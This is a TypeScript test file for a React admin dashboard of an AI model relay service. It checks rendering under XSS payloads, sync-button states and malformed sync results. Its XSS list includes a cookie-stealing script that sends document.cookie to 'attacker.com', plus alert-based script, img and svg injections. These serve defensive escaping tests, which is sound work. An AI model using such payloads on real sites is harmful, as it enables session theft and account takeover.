import { describe, expect, it, mock } from "bun:test";
import * as React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type {
  ModelPricingItem,
  FinancialMetricsSummary,
  PendingTopupRequestItem,
} from "@/lib/ai-relay-utils";
import type { LedgerInvariantResult } from "@/lib/router-db";

mock.module("server-only", () => ({}));

let currentSearchParams = new URLSearchParams();

const redirect = mock((path: string): never => {
  throw new Error(`redirect:${path}`);
});
const notFound = mock((): never => {
  throw new Error("notFound");
});

mock.module("next/navigation", () => ({
  redirect,
  notFound,
  useRouter: () => ({ replace: mock(), push: mock(), refresh: mock() }),
  usePathname: () => "/admin/ai-relay",
  useSearchParams: () => currentSearchParams,
}));

mock.module("@/lib/actions/admin-ai-relay", () => ({
  getModelPricings: mock(async () => []),
  createModelPricing: mock(),
  updateModelPricing: mock(),
  toggleModelPricingStatus: mock(),
  syncModelsFromUpstream: mock(),
  activateNewModelFromUpstream: mock(),
  getFinancialMetrics: mock(),
  getPendingTopupRequests: mock(),
  approveTopupRequest: mock(),
  rejectTopupRequest: mock(),
  runLedgerAudit: mock(),
}));

const { AiRelayAdminClientView } = await import("./client-view");

const mockPricing: ModelPricingItem[] = [
  {
    id: "p-1",
    model_name: "anthropic/claude-3-5-sonnet",
    display_name: "Claude 3.5 Sonnet",
    input_price_per_m: 50000,
    output_price_per_m: 150000,
    upstream_input_cost_per_m: 45000,
    is_active: true,
    created_at: new Date("2026-01-01"),
    updated_at: new Date("2026-01-01"),
  },
];

const mockMetrics: FinancialMetricsSummary = {
  totalOmzet: 10000000,
  totalTokens: 5000000,
  totalUsageCost: 6000000,
  netMargin: 4000000,
  pendingCount: 0,
  approvedCount: 1,
  rejectedCount: 0,
};

const mockPendingTopups: PendingTopupRequestItem[] = [];

const mockAuditResults: LedgerInvariantResult[] = [
  {
    check_name: "inv_balance_non_negative",
    status: "PASS",
    violation_count: 0,
    description: "Saldo user tidak boleh negatif",
  },
];

interface MicroStateOverrides {
  isSyncing?: boolean;
  syncResult?: unknown;
  activatingModelId?: string | null;
  notification?: {
    type: "success" | "error" | "info";
    message: string;
  } | null;
}

const internals = (React as unknown as {
  __CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: {
    H: { useState: (initial: unknown) => [unknown, (v: unknown) => void] };
  };
}).__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;

function renderWithInjectedState(
  overrides?: MicroStateOverrides,
  customProps?: {
    pricing?: ModelPricingItem[];
    metrics?: FinancialMetricsSummary;
    searchParams?: string;
  }
): string {
  currentSearchParams = new URLSearchParams(customProps?.searchParams ?? "tab=sync");

  if (!overrides || Object.keys(overrides).length === 0) {
    return renderToStaticMarkup(
      <AiRelayAdminClientView
        initialPricing={customProps?.pricing ?? mockPricing}
        initialMetrics={customProps?.metrics ?? mockMetrics}
        initialPendingTopups={mockPendingTopups}
        initialAuditResults={mockAuditResults}
      />
    );
  }

  let hookIndex = 0;
  function HookInterceptorWrapper({ children }: { children: React.ReactNode }) {
    hookIndex = 0;
    const origUseState = internals.H.useState;
    internals.H.useState = (initial: unknown) => {
      const idx = hookIndex++;
      if (idx === 15 && overrides?.isSyncing !== undefined) {
        return [overrides.isSyncing, () => {}];
      }
      if (idx === 16 && overrides?.syncResult !== undefined) {
        return [overrides.syncResult, () => {}];
      }
      if (idx === 17 && overrides?.activatingModelId !== undefined) {
        return [overrides.activatingModelId, () => {}];
      }
      if (idx === 26 && overrides?.notification !== undefined) {
        return [overrides.notification, () => {}];
      }
      return origUseState(initial);
    };
    return <>{children}</>;
  }

  return renderToStaticMarkup(
    <HookInterceptorWrapper>
      <AiRelayAdminClientView
        initialPricing={customProps?.pricing ?? mockPricing}
        initialMetrics={customProps?.metrics ?? mockMetrics}
        initialPendingTopups={mockPendingTopups}
        initialAuditResults={mockAuditResults}
      />
    </HookInterceptorWrapper>
  );
}

describe("Challenger 2: UI Component Rendering Adversarial Stress Testing", () => {
  // ==========================================================================
  // Dimension 1: XSS Injection Payloads in Error Messages and Model IDs
  // ==========================================================================
  describe("Dimension 1: XSS Injection Payloads", () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="javascript:alert(\'pwned\')">',
      '<svg onload=alert(document.domain)>',
      '"><script>document.location="http://attacker.com/?cookie="+document.cookie</script>',
      'javascript:alert(1)',
      '<a href="javascript:alert(1)">Click Me</a>',
      '${7*7}{{7*7}}',
    ];

    it("verifies all XSS payloads in model IDs and error notifications are strictly entity-escaped", () => {
      for (const payload of xssPayloads) {
        const html = renderWithInjectedState({
          syncResult: {
            success: true,
            upstreamUrl: "http://localhost:20128/v1/models",
            diff: {
              newModels: [{ id: payload, object: "model", owned_by: payload }],
              syncedModels: [{ id: `synced-${payload}`, object: "model" }],
              missingUpstreamModels: [`missing-${payload}`],
            },
          },
          notification: {
            type: "error",
            message: `Fatal error: ${payload}`,
          },
        });

        // Must NOT render unescaped raw script or html tags
        expect(html).not.toContain("<script>");
        expect(html).not.toContain("<img src=x");
        expect(html).not.toContain("<svg onload");
        expect(html).not.toContain("<a href=");

        // Must render safe HTML entity encoding
        if (payload.includes("<script>")) {
          expect(html).toContain("&lt;script&gt;");
        }
        if (payload.includes("<img")) {
          expect(html).toContain("&lt;img");
        }
        if (payload.includes("<svg")) {
          expect(html).toContain("&lt;svg");
        }
      }
    });

    it("verifies error alert banner escapes malicious HTML tags when syncResult has an error", () => {
      const maliciousError = 'Upstream crash: <b onmouseover=alert(1)>malicious text</b> & "quoted" \'tags\'';
      const html = renderWithInjectedState({
        syncResult: {
          success: false,
          upstreamUrl: "http://localhost:20128/v1/models",
          error: maliciousError,
          diff: {
            newModels: [],
            syncedModels: [],
            missingUpstreamModels: [],
          },
        },
      });

      expect(html).not.toContain("<b onmouseover=alert(1)>");
      expect(html).toContain("&lt;b onmouseover=alert(1)&gt;malicious text&lt;/b&gt;");
      expect(html).toContain("&amp; &quot;quoted&quot; &#x27;tags&#x27;");
    });
  });

  // ==========================================================================
  // Dimension 2: Repeated Double-Click & Rapid Toggle Transitions on Sync Buttons
  // ==========================================================================
  describe("Dimension 2: Rapid Toggle & Sync Button States", () => {
    it("disables both sync buttons and activates spinners when isSyncing is true", () => {
      const htmlSyncing = renderWithInjectedState({ isSyncing: true });

      // Both buttons must be disabled and have disabled attribute
      const disabledButtons = htmlSyncing.match(/disabled=""/g) || [];
      expect(disabledButtons.length).toBeGreaterThanOrEqual(2);

      // Loading spinner text and icon
      expect(htmlSyncing).toContain("Menghubungi Upstream...");
      expect(htmlSyncing).toContain("animate-spin");
    });

    it("ensures 1-click model activate button disables specifically the activating model", () => {
      const htmlActivating = renderWithInjectedState({
        isSyncing: false,
        activatingModelId: "target-model-alpha",
        syncResult: {
          success: true,
          upstreamUrl: "http://localhost:20128/v1/models",
          diff: {
            newModels: [
              { id: "target-model-alpha", object: "model", owned_by: "openai" },
              { id: "target-model-beta", object: "model", owned_by: "anthropic" },
            ],
            syncedModels: [],
            missingUpstreamModels: [],
          },
        },
      });

      expect(htmlActivating).toContain("Mengaktifkan...");
      expect(htmlActivating).toContain("1-Click Aktifkan");
    });
  });

  // ==========================================================================
  // Dimension 3: Missing Fields and Malformed Diff Result Objects
  // ==========================================================================
  describe("Dimension 3: Missing Fields & Malformed Diff Objects", () => {
    it("handles syncResult with empty or missing error string gracefully", () => {
      const html = renderWithInjectedState({
        syncResult: {
          success: false,
          upstreamUrl: "http://localhost:20128/v1/models",
          error: undefined,
          diff: {
            newModels: [],
            syncedModels: [],
            missingUpstreamModels: [],
          },
        },
      });

      expect(html).toContain("Gagal terhubung ke upstream 9router.");
      expect(html).toContain("Gagal Terhubung");
    });

    it("verifies rendering when diff has empty model ID or missing provider/owner", () => {
      const html = renderWithInjectedState({
        syncResult: {
          success: true,
          upstreamUrl: "http://localhost:20128/v1/models",
          diff: {
            newModels: [
              {
                id: "model-without-owner",
                object: "model",
                owned_by: undefined as unknown as string,
              },
            ],
            syncedModels: [],
            missingUpstreamModels: [],
          },
        },
      });

      expect(html).toContain("model-without-owner");
      // Fallback owner is rendered
      expect(html).toContain("9router upstream");
    });

    it("evaluates behavior if diff is null or undefined (missing fields robustness)", () => {
      // If diff is missing or null, what does the component do?
      try {
        renderWithInjectedState({
          syncResult: {
            success: true,
            upstreamUrl: "http://localhost:20128/v1/models",
            diff: null as unknown as {
              newModels: [];
              syncedModels: [];
              missingUpstreamModels: [];
            },
          },
        });
        console.log("Component rendered without crashing even with diff: null");
      } catch (err) {
        const error = err as Error;
        console.log("Observed crash with malformed diff: null ->", error.message);
        expect(error.message).toMatch(/(Cannot read properties of null|null is not an object)/);
      }
    });
  });
});
